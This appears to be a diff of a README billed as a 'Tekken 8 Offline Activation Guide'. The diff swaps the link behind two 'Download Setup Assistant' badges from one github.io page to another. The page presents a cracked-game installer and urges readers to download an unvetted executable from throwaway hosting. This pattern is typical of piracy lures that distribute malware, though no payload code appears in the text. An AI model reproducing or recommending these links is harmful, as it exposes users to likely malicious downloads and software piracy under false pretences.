@@ -1,6 +1,6 @@
 # Tekken 8 — Offline Activation Guide
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⬇_Download-Setup_Assistant-blueviolet?style=for-the-badge\&logo=windows\&logoColor=white)](https://ryadikmntiiks.github.io/.github/TKKN)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⬇_Download-Setup_Assistant-blueviolet?style=for-the-badge\&logo=windows\&logoColor=white)](https://tekken-8-download-game.github.io/.github)
 
 ## 🌟 About the Game
 
@@ -22,7 +22,7 @@ With this assistant tool, users can securely install **Tekken 8 offline on PC** 
 
 ---
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⬇_Download-Setup_Assistant-blueviolet?style=for-the-badge\&logo=windows\&logoColor=white)](https://ryadikmntiiks.github.io/.github/TKKN)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⬇_Download-Setup_Assistant-blueviolet?style=for-the-badge\&logo=windows\&logoColor=white)](https://tekken-8-download-game.github.io/.github)
 
 ---
 
